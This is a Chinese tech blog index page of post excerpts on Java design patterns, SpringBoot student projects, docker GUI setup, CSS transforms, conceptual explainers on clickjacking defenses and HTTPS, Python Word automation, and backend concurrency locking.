算法的框架已经确定，但某些步骤的具体实现可能会变化：
当算法的框架已经确定，但某些具体步骤的实现可能会变化时，可以使用模板方法模式
重用性要求较高：
当希望在不改变算法结构的情况下，重用算法的某些部分时，可以使用模板方法模式
固定算法的框架，但允许具体步骤的实现发生变化：
当希望固定算法的框架，但允许具体步骤的实现发生变化时，可以使用模板方法模式
3. 代码实现 下面通过一个简单的例子来演示模板方法模式的实现。假设有一个咖啡和茶的制备过程，我们可以使用模板方法模式定义一个制备饮料的框架。
抽象模板 - 制备饮料 BeverageTemplate
package com.cheney.demo; abstract class BeverageTemplate { // 制备饮料的算法骨架 public final void prepareBeverage() { boilWater(); brew(); pourInCup(); addCondiments(); } // 烧水 protected void boilWater() { System.out.println("烧水"); } // 冲泡 protected abstract void brew(); // 倒入杯中 protected void pourInCup() { System.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/29f77ca60c1473fefe44c6ddf633c8b7/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/81d32e9bc158d9d6de4a0c601908c763/" rel="bookmark">
			Java 基于SpringBoot&#43;Vue的母婴商城系统，附源码，文档
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		博主介绍：✌程序员徐师兄、7年大厂程序员经历。全网粉丝30W+、csdn博客专家、掘金/华为云/阿里云/InfoQ等平台优质作者、专注于Java技术领域和毕业项目实战✌
🍅文末获取源码联系🍅
👇🏻 精彩专栏推荐订阅👇🏻 不然下次找不到哟
2022-2024年最全的计算机软件毕业设计选题大全：1000个热门选题推荐✅
Java项目精品实战案例《100套》
Java微信小程序项目实战《100套》
感兴趣的可以先收藏起来，还有大家在毕设选题，项目以及文档编写等相关问题都可以给我留言咨询，希望帮助更多的人
摘 要 基于 SpringBoot+Vue 的母婴商城平台，是基于Java 开发的，使用 SpringBoot+Vue 。该项目功能完整，有完整的文档，适合大学生用于实战。
同时，本人整理了Java 大学生常用的技巧，主要讲解怎样定位关键代码，怎样 debug。我一直认为授人以鱼不如授人以渔，价值至少 在几百元以上
如何快速定位代码，找到项目的关键代码如何快速 debug 代码，包括 SpringBoot+vue 的运行技巧 1 简介 当前社会各行业领域竞争压力非常大，随着当前时代的信息化，科学化发展，让社会各行业领域都争相使用新的信息技术，对行业内的各种相关数据进行科学化，规范化管理。这样的大环境让那些止步不前，不接受信息改革带来的信息技术的企业随时面临被淘汰，被取代的风险。所以当今，各个行业领域，不管是传统的教育行业，餐饮行业，还是旅游行业，医疗行业等领域都将使用新的信息技术进行信息革命，改变传统的纸质化，需要人手工处理工作事务的办公环境。软件信息技术能够覆盖社会各行业领域是时代的发展要求，各种数据以及文件真正实现电子化是信息社会发展的不可逆转的必然趋势。本母婴商城系统也是紧跟科学技术的发展，运用当今一流的软件技术实现软件系统的开发，让母婴商城信息完全通过管理系统实现科学化，规范化，程序化管理。从而帮助信息管理者节省事务处理的时间，降低数据处理的错误率，对于基础数据的管理水平可以起到促进作用，也从一定程度上对随意的业务管理工作进行了避免，同时，母婴商城系统的数据库里面存储的各种动态信息，也为上层管理人员作出重大决策提供了大量的事实依据。总之，母婴商城系统是一款可以真正提升管理者的办公效率的软件系统。
2 相关技术 使用框架：springboot
开发语言：Java、
框架：springboot，
JDK版本：JDK1.8 ，
服务器：tomcat7或者8 ，
数据库：mysql 5.7，
数据库工具：Navicat11，
开发软件：eclipse/myeclipse/idea，
浏览器：谷歌浏览器，
3 系统设计 母婴商城系统的设计方案比如功能框架的设计，比如数据库的设计的好坏也就决定了该系统在开发层面是否高效，以及在系统维护层面是否容易维护和升级，因为在系统实现阶段是需要考虑用户的所有需求，要是在设计阶段没有经过全方位考虑，那么系统实现的部分也就无从下手，所以系统设计部分也是至关重要的一个环节，只有根据用户需求进行细致全面的考虑，才有希望开发出功能健全稳定的程序软件。
4 系统实现 系统实现部分就是将系统分析，系统设计部分的内容通过编码进行功能实现，以一个实际应用系统的形式展示系统分析与系统设计的结果。前面提到的系统分析，系统设计最主要还是进行功能，系统操作逻辑的设计，也包括了存储数据的数据库方面的设计等内容，系统实现就是一个最终的实施阶段，将前面的设计成果进行物理转化，最终出具可以运用于实际的软件系统。
4.1用户信息管理 如图5.1显示的就是用户信息管理页面，此页面提供给管理员的功能有：用户信息的查询管理，可以删除用户信息、修改用户信息、新增用户信息，
还进行了对用户名称的模糊查询的条件
图5.1 用户信息管理页面
4.2 商品分类管理 如图5.2显示的就是商品分类管理页面，此页面提供给管理员的功能有：查看已发布的商品分类数据，修改商品分类，商品分类作废，即可删除。
图5.2 商品分类管理页面
4.3商品信息管理 如图5.3显示的就是商品信息管理页面，此页面提供给管理员的功能有：根据商品名称进行条件查询，还可以对商品数据进行新增、修改、查询操作等等。
图5.3 商品信息管理页面
4.1商品资讯管理 如图5.4显示的就是商品资讯管理页面，此页面提供给管理员的功能有：查看已发布的商品资讯数据，修改商品资讯，商品资讯作废，即可删除。
图5.4 商品资讯管理页面
6 参考文献 [1]宁昭铱,陈静,张立斌.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/81d32e9bc158d9d6de4a0c601908c763/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/773de8e4bd3abfa74b1a9af9e9feb7cd/" rel="bookmark">
			基于 SpringBoot&#43;Vue 的读书笔记共享平台的研究与实现，附源码，文档
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		博主介绍：✌程序员徐师兄、7年大厂程序员经历。全网粉丝30W+、csdn博客专家、掘金/华为云/阿里云/InfoQ等平台优质作者、专注于Java技术领域和毕业项目实战✌
🍅文末获取源码联系🍅
👇🏻 精彩专栏推荐订阅👇🏻 不然下次找不到哟
2022-2024年最全的计算机软件毕业设计选题大全：1000个热门选题推荐✅
Java项目精品实战案例《100套》
Java微信小程序项目实战《100套》
感兴趣的可以先收藏起来，还有大家在毕设选题，项目以及文档编写等相关问题都可以给我留言咨询，希望帮助更多的人
摘 要 基于 SpringBoot+Vue 的读书笔记共享平台，是基于 SpringBoot+Vue 开发的。该项目功能完整，有文档，适合大学生用于实战。
同时，本人整理了Java 大学生常用的技巧，主要讲解怎样定位关键代码，怎样 debug。我一直认为授人以鱼不如授人以渔，价值至少 在几百元以上
如何快速定位代码，找到项目的关键代码如何快速 debug 代码，包括 SpringBoot+vue 的运行技巧 本文从管理员、用户的功能要求出发，读书笔记共享平台系统中的功能模块主要是实现管理员；首页、个人中心、用户管理、笔记分享管理、个人笔记管理、管理员管理、交流互动、系统管理。用户：首页、个人中心、笔记分享管理、个人笔记管理、我的收藏管理。前台首页：首页、笔记分享、交流信息、个人中心、后台管理。经过认真细致的研究，精心准备和规划，最后测试成功，系统可以正常使用。分析功能调整与读书笔记共享平台实现的实际需求相结合，讨论了Java开发读书笔记共享平台的使用。
本论文主要论述了如何使用JAVA语言开发一个读书笔记共享平台
，本系统将严格按照软件开发流程进行各个阶段的工作，采用B/S架构，面向对象编程思想进行项目开发。在引言中，作者将论述读书笔记共享平台的当前背景以及系统开发的目的，后续章节将严格按照软件开发流程，对系统进行各个阶段分析设计。本论文介绍了读书笔记共享平台系统中分析到设计最后到开发的全过程,在开发过程中,通过在这些读书笔记共享平台系统,利用专业网站已有的系统进行活动本系统有管理员、用户及前台首页。
**关键字：**读书笔记共享平台 Java语言 Springboot框架
1 简介 本文首先以读书笔记共享平台过程的基本问题作为研究对象。在开发系统之前，我们对现有状况进行了详细的调查和分析。最后，我们利用计算机技术开发了一套完整合适的读书笔记共享平台
。该系统的实现主要优势是：该系统主要采用计算机技术开发，它方便快捷；系统可以通过管理员界面查看系统所涉及的读书笔记共享平台所有信息管理。
读书笔记共享平台软件是一款方便、快捷、实用的信息服务查询软件。随着智能网络在全球市场的不断普及以及各种智能平台的使用，作为中国主流智能的技术开发系统，自然需要这样的软件来满足更多用户的需求和体验。系统的开发与用户的日常需求相关，如通过读书笔记共享平台系统获取到更多信息和详细情况，了解最新读书笔记共享信息等。
虽然目前已有很多基于Java平台的读书笔记共享平台相关的平台系统，但尚未出现更详细的功能显示和信息查询。经过分析，用户的第一眼往往是看到一个软件的外观，一个漂亮的界面将吸引用户下一次点击和理解。为了让用户通过无意识的点击尝试进入每个界面和每个按钮，用户可以进一步了解软件的质量，因此良好的软件界面将是吸引用户注意力的第一步。因此，对于每个软件界面设计工作来说，一个应用程序是占据非常重要的一部分，在高端大气中吸引用户界面，满足用户体验将进一步完成整个应用程序的各项功能，良好的用户体验度将继续使用并经常打开并使用此软件。
2 技术栈 环境需要 1.运行环境：最好是java jdk 1.8，这是目前最稳定的JDK也是被使用最多的JDK版本。
2.IDE环境：IDEA，Eclipse都可以。推荐IDEA;
3.tomcat环境：Tomcat7/Tomcat8/Tomcat9版本均可
4.硬件环境：windows 7/8/10 1G内存以上；或者 Mac OS；
5.数据库：MySql 5.7版本；
6.是否Maven项目：是；
技术栈 后端：Spring+SpringMVC+Mybatis+Springboot
前端：vue+CSS+JavaScript+jQuery+elementui
使用说明 使用Navicat或者其它工具，在mysql中创建对应名称的数据库，并导入项目的sql文件；
使用IDEA/Eclipse/MyEclipse导入项目，修改配置，运行项目；
将项目中applicationContext.xml配置文件中的数据库配置改为自己的配置，然后运行；
运行成功后，在浏览器中输入：http://localhost:8080/项目
3.系统功能设计 软件的用户界面是最直接接触的对象，包括是否允许用户使用简单方便，请求的响应时间，主图像的整体质量，整体布局的质量。
读书笔记共享平台的设计基于现有的网络平台，可以实现用户管理及数据信息管理，方便管理员对后台进行管理有详细的了解及统计分析，随时查看信息状态。
系统功能设计是在系统开发和设计思想的总体任务的基础上完成的。该系统的主要任务是实现读书笔记共享平台管理，使用户可以通过指令完成整个读书笔记共享平台的操作。
从上面的描述中可以基本可以实现软件的功能：
1、开发实现读书笔记共享平台的整个系统程序；
2、管理员；首页、个人中心、用户管理、笔记分享管理、个人笔记管理、管理员管理、交流互动、系统管理等。
3、用户：首页、个人中心、笔记分享管理、个人笔记管理、我的收藏管理。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/773de8e4bd3abfa74b1a9af9e9feb7cd/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/69dcad0c01ba8c976786868b6a693d4a/" rel="bookmark">
			解决docker无法打开UI界面问题(error: cannot open display)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 在项目搭建过程中，遇到了docker中无法显示UI界面的问题，参考了这篇文章，并使用了其中的方法一进行了解决。要点信息摘录如下：
原理上可以把docker镜像看做一台没配显示器的电脑，程序可以运行，但是没地方显示。而linux目前的主流图像界面服务X11又支持 客户端/服务端（Client/Server）的工作模式。只要在容器启动的时候，将 『unix:端口』或『主机名:端口』共享给docker,docker 就可以通过端口找到显示输出的地方，和linux系统共用显示。
按照文章要求我重新修改了构建容器时的代码，今后构建Cyberdog2容器时，可以通过下述修改，直接创建一个支持UI界面的docker。具体命令如下：
sudo docker run --privileged=true -it --name &lt;新建容器的名称&gt; \ -v &lt;关联到的容器外部目录&gt;:&lt;关联到的容器内部目录&gt; \ -v /tmp/.X11-unix:/tmp/.X11-unix \ -e DISPLAY=unix$DISPLAY \ -e GDK_SCALE \ -e GDK_DPI_SCALE \ cyberdog_v1.3:1.0.0 bash 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f73dbfcc86a8c9e6719dbbc61b2ee8fc/" rel="bookmark">
			移动Web——平面转换-旋转
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、平面转换-旋转 &lt;!DOCTYPE html&gt; &lt;html lang="en"&gt; &lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt; &lt;title&gt;Document&lt;/title&gt; &lt;style&gt; img { width: 200px; transition: all 2s; } /* 鼠标悬停到图片上面，添加旋转效果 */ img:hover { /* 正数：顺时针旋转； 负数：逆时针旋转 */ transform: rotate(360deg); transform: rotate(-360deg); } &lt;/style&gt; &lt;/head&gt; &lt;body&gt; &lt;img src="../photo/1.jpg" alt=""&gt; &lt;/body&gt; &lt;/html&gt; 2、平面旋转-改变转换原点 默认情况下，转换原点是盒子中心点
取值
方位名词（left、top、right、bottom、center）像素单位数值百分比 &lt;!DOCTYPE html&gt; &lt;html lang="en"&gt; &lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt; &lt;title&gt;Document&lt;/title&gt; &lt;style&gt; img { width: 200px; border: 1px solid #000; transition: all 1s; transform-origin: right bottom; } img:hover { transform: rotate(360deg); } &lt;/style&gt; &lt;/head&gt; &lt;body&gt; &lt;img src="
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f73dbfcc86a8c9e6719dbbc61b2ee8fc/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f726a629c69b2d4d98d3cb26ab68aeca/" rel="bookmark">
			Web 安全之点击劫持（Clickjacking）攻击详解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
什么是点击劫持攻击？
点击劫持攻击的原理
点击劫持攻击的危害
点击劫持攻击防范措施
小结
在当今数字化时代，网络安全问题日益凸显，各种网络攻击手段层出不穷。点击劫持（Clickjacking）攻击作为一种常见的网络攻击手段，对用户的个人信息和财产安全构成严重威胁。本文将详细讲解点击劫持攻击的原理、危害、攻击方式及防范措施。
什么是点击劫持攻击？ 点击劫持（Clickjacking）攻击，又称为界面伪装攻击，是一种利用视觉欺骗手段进行攻击的方式。攻击者通过技术手段欺骗用户点击本没有打算点击的位置，当用户在被攻击者攻击的页面上进行操作时，实际点击结果被劫持，从而被攻击者利用。这种攻击方式利用了用户对网站的信任，通过覆盖层（通常是透明的iframe）覆盖在另一个网页之上，使受害者无法察觉。
点击劫持攻击的原理 点击劫持攻击通常涉及到以下几个关键点：
视觉欺骗，攻击者使用一个透明的 iframe 覆盖在目标网页上，由于 iframe 是透明的，用户看不到底层的实际内容，从而在执行操作时，以为是点击了顶层的内容，但实际上是点击了底层 iframe 中的内容。视觉伪装，为了进一步迷惑用户，攻击者通常会在其创建的网页上放置一些吸引用户的元素，如游戏、视频播放器等，当用户点击这些看似无害的区域时，实际上触发的是隐藏在其下的目标网站中的敏感操作。用户交互，当用户尝试点击覆盖层上的按钮或链接时，实际上他们点击的是下面的 iframe 中目标网站上的按钮或链接。然后会执行相应的恶意操作，如提交表单、跳转链接等，从而达到攻击者的目的。 点击劫持攻击的危害 点击劫持攻击可能会对用户和企业造成严重危害，例如：
窃取敏感信息：攻击者可以利用点击劫持漏洞诱导用户点击恶意链接或按钮，窃取用户的敏感信息，如账号密码、信用卡信息等。执行恶意操作：攻击者可以通过点击劫持漏洞诱导用户执行恶意操作，如自动提交表单、发送垃圾邮件等。破坏网站安全：攻击者可以利用点击劫持漏洞破坏网站的安全性，导致网站被篡改、数据泄露等。影响用户体验：攻击者可以利用点击劫持漏洞干扰用户的正常操作，影响用户体验。信任损失：企业可能会因为用户遭受点击劫持攻击而失去用户信任。 点击劫持攻击防范措施 对于网站所有者而言：
可以在 HTTP 响应头中设置 X-Frame-Options 属性，从而控制自己的网站是否可以在 iframe 中显示，例如设置为 DENY 表示不允许任何域加载该资源，SAMEORIGIN 表示仅允许同源请求加载，可以有效防止点击劫持攻击。可以设置 Content Security Policy (CSP)，CSP 是一个更强大的控制策略，用于限制网站资源的加载，从而防范点击劫持漏洞。可以在页面中添加 JavaScript 代码来检测并阻止页面被嵌入到 iframe 中。 对于用户而言：
使用现代的浏览器，现代浏览器内置了多种安全特性，可以帮助防范点击劫持攻击。安装安全插件，一些浏览器插件可以提供额外的保护，比如 NoScript 可以限制 JavaScript的 执行，从而阻止某些站点遭受点击劫持攻击。提高安全意识，不轻易点击来源不明的链接，不随意授权第三方应用。 小结 点击劫持是一种利用用户信任和视觉欺骗进行攻击的手段，利用了 Web 技术中的漏洞来欺骗用户执行攻击者想要的操作。防范此类攻击需要从服务器配置、浏览器防护、开发实践以及用户教育等多个角度综合应对。了解并掌握点击劫持的工作原理及对应的防范方法，对于提高网络安全水平具有重要意义。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2aa9a215ccb2b00b23369241695f990d/" rel="bookmark">
			【GitHub项目推荐--不错的 TypeScript 学习项目】【转载】
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在线白板工具 Excalidraw 标星 33k，是一款非常轻量的在线白板工具，可以直接在浏览器打开，轻松绘制具有手绘风格的图形。
如下图所示，Excalidraw 支持最常用的图形元素：方框、圆、菱形、线，可以方便的使用这些元素绘制简洁的图形，你也可以通过画笔快速描绘。
编程语言：TypeScript
开源地址：https://github.com/excalidraw/excalidraw
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f7366ee51234051090b4e791f17da721/" rel="bookmark">
			深入解析HTTPS：安全机制全方位剖析
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		随着互联网的深入发展，网络传输中的数据安全性受到了前所未有的关注。HTTPS，作为HTTP的安全版本，为数据在客户端和服务器之间的传输提供了加密和身份验证，从而确保了数据的机密性、完整性和身份真实性。本文将详细探讨HTTPS背后的安全机制，包括SSL/TLS协议的工作原理、使用的加密技术、数字证书的重要性等，旨在为读者提供一个全面且深入的理解HTTPS的机会。
当我们浏览网页、使用在线支付或进行在线购物时，我们的数据（如密码、信用卡信息等）需要在互联网上传输。如果这些数据以明文形式传输，那么它们很容易被恶意第三方截获和滥用。为了解决这个问题，HTTPS协议被引入，它为客户端和服务器之间的通信提供了一个加密的通道。
一、回顾一下Http通信过程 1️⃣ 单向认证 以下是HTTPS的单向认证过程。在单向认证中，客户端验证服务器的身份，但服务器并不验证客户端的身份。这是最常见的HTTPS通信方式，适用于大多数网页浏览和互联网服务。
单向认证流程中，服务器端保存着公钥证书和私钥两个文件，整个握手过程如下：
客户端发起HTTPS请求： 用户在浏览器或其他客户端中输入一个HTTPS网址，然后客户端连接到服务器的443端口（HTTPS的默认端口）。
服务器响应并发送证书： 服务器响应客户端的请求，并发送其SSL/TLS数字证书给客户端。这个证书包含了服务器的公钥、证书颁发机构（CA）信息、服务器身份信息以及证书的签名等信息。
客户端验证服务器证书： 客户端接收到服务器的证书后，会验证证书的合法性。这包括检查证书的颁发机构是否可信、证书是否在有效期内、以及证书的签名是否有效等。如果证书验证失败，客户端会发出警告或中断连接。
密钥交换与生成： 如果服务器证书验证通过，客户端会生成一个随机的预主密钥（pre-master secret），并使用服务器的公钥进行加密后发送给服务器。服务器使用自己的私钥解密得到预主密钥。然后，客户端和服务器都基于这个预主密钥和一些其他参数，生成一个会话密钥（session key）。这个会话密钥将用于后续的数据加密和解密。
建立安全连接： 客户端和服务器使用协商出的会话密钥对传输的数据进行加密，确保数据在传输过程中的安全。此后，客户端和服务器之间的所有通信都会使用这个会话密钥进行加密。
数据传输： 在安全连接建立后，客户端和服务器就可以开始传输数据了。所有的数据在传输前都会被加密，接收方在收到数据后会使用会话密钥进行解密，以获取原始数据。
连接关闭： 当数据传输完成后，客户端和服务器会关闭连接。如果需要再次通信，它们会重新进行上述的握手和密钥交换过程。
通过上述过程，HTTPS确保了数据在传输过程中的机密性、完整性和身份真实性，从而为用户提供了更安全、更可靠的互联网通信体验。
2️⃣ 双向认证 双向认证(又称为双向SSL认证或双向TLS认证）是一个更严格的安全过程，其中不仅客户端验证服务器的身份，服务器也验证客户端的身份。这通常用于需要更高安全级别的应用，如银行交易或企业内部的敏感数据传输。
在双向认证中，除了单向认证的所有步骤外，还会增加以下步骤：
客户端在发送HTTPS请求时，也会将自己的数字证书发送给服务器。服务器验证客户端证书的合法性。如果客户端证书验证失败，服务器可以拒绝连接。如果客户端证书验证通过，服务器和客户端继续进行密钥交换和建立安全连接的过程。
由于双向认证增加了额外的安全层，它提供了更高级别的安全保障，但同时也增加了配置的复杂性和成本。因此，它通常只在需要最严格安全保障的场景中使用。
一、SSL/TLS协议详解 HTTPS（全称：Hypertext Transfer Protocol Secure），是以安全为目标的HTTP通道，在HTTP的基础上通过传输加密和身份认证保证了传输过程的安全性。HTTPS在HTTP的基础下加入SSL层，HTTPS的安全基础是SSL，因此加密的详细内容就需要SSL。
SSL（Secure Sockets Layer）及其后续版本TLS（Transport Layer Security）是HTTPS的核心。它们是一个安全协议，用于在两个通信应用程序之间提供隐私和数据完整性。
1. 握手过程：
这是SSL/TLS协议中最为关键的部分。当客户端（如浏览器）尝试与服务器建立安全连接时，它们会经历一个握手过程。这个过程中，客户端和服务器会协商使用哪种加密套件、交换密钥、验证服务器的身份等。
客户端发送支持的加密套件列表给服务器。服务器选择其中一个加密套件，并发送其数字证书给客户端。客户端验证服务器的数字证书。如果证书有效，客户端会生成一个随机的预主密钥（pre-master secret），并使用服务器的公钥加密后发送给服务器。服务器和客户端都使用这个预主密钥，结合一些其他参数，生成一个会话密钥（session key）。这个会话密钥将用于后续的数据加密。 2. 数据加密：
一旦握手过程完成，客户端和服务器就会使用协商出的会话密钥对传输的数据进行加密。这确保了即使数据被截获，攻击者也无法读取其内容。
3. 数据完整性：
除了加密，SSL/TLS还提供了数据完整性保护。通过使用消息认证码（MAC），可以确保数据在传输过程中没有被篡改。
二、 加密技术 HTTPS通信既使用了对称加密，也使用了非对称加密，二者在HTTPS通信过程中各自扮演了不同的角色。
1. 非对称加密：
用途：主要用于密钥交换和数字证书。非对称加密涉及公钥和私钥两个密钥，公钥用于加密数据，私钥用于解密数据。由于私钥不公开，因此非对称加密具有很高的安全性。过程：在HTTPS握手阶段，服务器将其公钥（包含在数字证书中）发送给客户端。客户端验证数字证书的有效性后，使用服务器的公钥加密一个随机生成的对称密钥（会话密钥），然后发送给服务器。服务器使用其私钥解密得到会话密钥。 2. 对称加密：
用途：主要用于实际数据传输的加密。对称加密使用相同的密钥进行加密和解密，加密速度快，适合大量数据的加密。过程：在客户端和服务器通过非对称加密协商好会话密钥后，双方使用该会话密钥对传输的数据进行对称加密。加密后的数据在传输过程中即使被截获，攻击者也无法解密，保证了数据的安全性。 总结来说，HTTPS通信过程中，非对称加密主要用于密钥交换和数字证书验证，确保会话密钥的安全传输；而对称加密则用于实际数据传输的加密，保证数据在传输过程中的机密性。这样结合使用对称加密和非对称加密，既保证了数据的安全性，又提高了加密效率。
三、数字签名和摘要的原理 在HTTPS通信流程中，数字签名和摘要都是确保数据完整性和安全性的重要机制。以下是它们的原理：
1. 数字签名原理
签名生成：发送方（在HTTPS中通常是服务器）使用自己的私钥对数据的摘要进行加密，生成数字签名。摘要是通过Hash函数从原始数据中计算出来的固定长度的字符串，它代表了数据的唯一特征。
签名验证：接收方（在HTTPS中通常是客户端）收到数据和数字签名后，使用发送方的公钥对签名进行解密，得到摘要A。同时，接收方也使用相同的Hash函数对接收到的数据进行计算，得到摘要B。
比较摘要：接收方将摘要A与摘要B进行比较。如果两者相同，说明数据在传输过程中没有被篡改，因为任何对数据的微小改动都会导致Hash值发生显著变化。这样，数字签名就验证了数据的完整性和来源。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f7366ee51234051090b4e791f17da721/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2052e3dd92a5972f410c488e6a705f76/" rel="bookmark">
			【GitHub项目推荐--图表编辑工具客户端】【转载】
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		基于 draw.io 编辑器开发的图表编辑工具客户端，该应用程序可以帮助你配置图标、流程图、UML图、ER图。
开源地址：https://github.com/jgraph/drawio
开源地址：https://github.com/jgraph/drawio-desktop
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/17fda8f2b5679ba272d821062fb18ae7/" rel="bookmark">
			如何把word檔案自動化
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.安裝 pip install jojo-office ( 安裝這個)
2.讀取表格內容與文章內容，範例如下
import office
from docx import Document
replace={“{user_name}”:“陳彥甫”, “{tele}”:“0912882881”}
doc=Document(“template.docx”)
table=doc.tables[0]
print(“ii:”+ str(len(table.rows)))
print(“jj:”+ str(len(table.columns)))
for old,new in replace.items():
# print(r,w)
for table in doc.tables:
for col in table.columns:
for cell in col.cells:
if cell.text == old:
cell.text = new
print(cell.text)
for paragraph in doc.paragraphs: # 整串找到有字串一樣的地方，就直接更換 if paragraph.text.find(old) &gt;= 0: paragraph.text = paragraph.text.replace(old,new) print("OK") #找到，整串換掉 doc.save(“test.docx”)
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f3f3f7cdbaa0355e3d56f2b5a1b2a2f4/" rel="bookmark">
			初级通信工程师-通信网络安全
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、信息系统的构成 ● 信息系统是将用于收集、处理、存储和传播信息的部件组织在一起而成的相互关 联的整体。 一般由计算机硬件、网络和通信设备、计算机软件、信息资源和信息用户 组成。
● 信息系统由信息基础设施和信息业务系统组成。
信息系统的构成
功能
分类
信息基础设施
信息系统的共用设施，由电信网络和计算机系统构成
按照功能结构分为电信网络、计算 机网络和计算机系统
信息业务系统
信息系统有关信息业务的设施，实现信息获取和信息应用功能
2、信息系统安全 ● 信息安全通常是指信息在采集、传递、存储和应用等过程中的完整性、机密性、 可用性、可控性和不可否认性。
● 所有层次的安全问题都将体现在信息应用安全层次之中。电信网络在执行其信息 传递过程中引入的安全问题是整个信息系统安全问题的基础。
● 目前，电信网络安全所面临的威胁主要包括：天灾、人为因素和系统本身的原 因。
● 美国的网络安全橙皮书用来评估计算机系统的安全性，即计算机安全级别，用来 评估多用户主机和小型操作系统的主要方法。网络安全橙皮书把安全的级别从低到高 分为4个类别： D 类 、C 类 、B 类 和A 类，其中D 类别是最低的安全级别， A 类别是 当前最高的安全级别。
● 我国按照各通信网络单元遭到破坏后可能对国家安全、经济运行、社会秩序和公 众利益造成的危害程度，将信息安全保护从低到高划分为5个级别。
3、通信网络安全 ● 通信网络安全通常包括承载网与业务网安全、网络服务安全及信息传递安全3个 部分。
● 通信网络安全的特点：可靠性、可用性、保密性、完整性和不可抵赖性。
● 可靠性是通信网络安全最基本的要求，是通信网络安全的基础。
● 保障信息的安全是通信网络安全的核心。
● 在通信网络中，信息大致可以分为两类：用户信号和网络信息。用户信息主要是 指面向用户的语音、数字、图像、文字和各种媒体库的信息；网络信息是面向网络运 作的信息。
● 在一般情况下，通信网络的安全主要是保障用户信息和网络信息的安全。
4、 电信网络安全的概念 ● 广义的电信网络安全概念适合于自然环境和对抗环境中的网络安全。而狭义的电信网络安全概念只适合丁对抗环境中的网络安全。
● 行为可信是指行为预期性的满足程度。可信性是对行为预期性的满足程度的评 价。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f3f3f7cdbaa0355e3d56f2b5a1b2a2f4/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0a5b6e778e66f520d73192ef866e19bb/" rel="bookmark">
			浪花 - 后端接口完善
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、队伍已加入用户数量 1. 封装的响应对象 UserTeamVO 新增字段 hasJoinNum
2. 查询队伍 id 列表
3. 分组过滤，将 team_id 相同的 userTeam 分到同一组
4. 获取每一组的 userTeam 数量，即一个 team_id 对应几个userTeam（用户数量）
5. 设置加入的队员数量 hasJoinNum 返回给前端
// 查询加入队伍的用户数 QueryWrapper&lt;UserTeam&gt; userTeamJoinNumQW = new QueryWrapper&lt;&gt;(); userTeamJoinNumQW.in("team_id", teamIdList); List&lt;UserTeam&gt; userTeamList = userTeamService.list(userTeamJoinNumQW); // 队伍 id =&gt; 加入该队伍的用户列表 Map&lt;Long, List&lt;UserTeam&gt;&gt; teamIdUserTeamList = userTeamList.stream().collect(Collectors.groupingBy(UserTeam::getTeamId)); teamList.forEach(team -&gt; { team.setHasJoinNum(teamIdUserTeamList.getOrDefault(team.getId(),new ArrayList&lt;&gt;()).size()); }); 二、重复加入队伍的问题 1. 问题：高并发场景下，用户疯狂点击加入队伍，可能会重复加入同一个队伍
一个请求开启一个线程，多次点击加入队伍，多个线程进入，判断用户是否已加入该队伍时都是未加入，都去执行加入队伍的业务出现同一个用户重复加入同一个队伍的情况，用户 - 队伍关系表中添加了多条记录，且已加入队伍的人数异常增加 2. 解决：使用 synchronized 关键字给判断队伍和加入队伍这段逻辑加锁
3. 优化：调整锁的粒度，分析锁的范围
不同用户可以加入不同队伍，如果给整段都加上锁，不同用户加入时可能会阻塞，降低性能锁用户：同一个用户不能重复加入同一个队伍锁队伍：同一个用户不能同时加入多个队伍（否则可能突破“每个用户最多创建和加入 5 个队伍的限制”） 注意：数据库插入数据之前，判断的都是用户未加入该队伍 / 用户创建和加入的队伍不满 5 个，如果把锁用户和锁队伍分开，一个线程拿到锁之后判断用户，结束判断去获取队伍的锁，线程 2 就可以拿到用户锁了，但是线程 1 还没有结束插入数据的业务（队伍锁），线程 2 也可以执行，不过是多等了一会，所以锁的范围要到将数据插入数据库完成才能释放锁，之后其他线程获取到锁再去判断数据库，此时数据库已经更改，判断才是有效的
	</div>
